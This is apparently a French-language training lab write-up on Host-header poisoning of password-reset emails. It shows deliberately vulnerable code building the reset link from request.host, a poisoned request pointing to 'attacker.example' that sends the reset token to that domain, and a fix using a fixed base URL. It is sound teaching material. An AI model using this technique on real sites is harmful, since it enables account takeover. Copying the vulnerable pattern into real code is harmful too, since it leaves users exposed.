Jour 3 / Lab 4B

Lien de reset construit à partir de l’en-tête Host

Ce lab garde la logique du token de reset propre. Le seul bug volontaire est que l’email de reset construit son lien à partir du host de la requête entrante, ce qui permet à un attaquant d’empoisonner le domaine envoyé à la victime.

Rappel rapide

L’en-tête HTTP Host est contrôlé par le client. Si une application l’utilise pour construire des URL absolues dans les emails de reset, l’email peut finir par pointer vers un domaine contrôlé par l’attaquant.

D’où vient la vulnérabilité

Le token de reset est créé correctement, mais l’URL de reset est construite à partir de request.host.

token = str(uuid.uuid4())
conn.execute(
    "INSERT INTO reset_tokens (token, username) VALUES (?, ?)",
    (token, username)
)

reset_link = f"http://{request.host}{url_for('reset_password')}?token={token}"

L’endpoint de reset lui-même est correct. Le token décide quel compte est réinitialisé, donc le seul défaut se trouve dans la génération du lien envoyé par email.

Comment fonctionne l’exploit

On déclenche une demande de reset et on empoisonne en même temps l’en-tête Host.

Requête empoisonnée

POST /forgot-password
Host: attacker.example
username=user

Email résultant

http://attacker.example/reset-password?token=<uuid>

Le token est toujours valide, mais le domaine dans l’email est désormais contrôlé par l’attaquant. Si une victime clique sur ce lien, le token arrive sur l’infrastructure de l’attaquant au lieu de la vraie application.

Correctif

Utiliser une URL de base de confiance configurée par l’application, pas un en-tête de la requête.

# vulnérable
reset_link = f"http://{request.host}{url_for('reset_password')}?token={token}"

# corrigé
PUBLIC_BASE_URL = "http://localhost:5007"
reset_link = f"{PUBLIC_BASE_URL}{url_for('reset_password')}?token={token}"
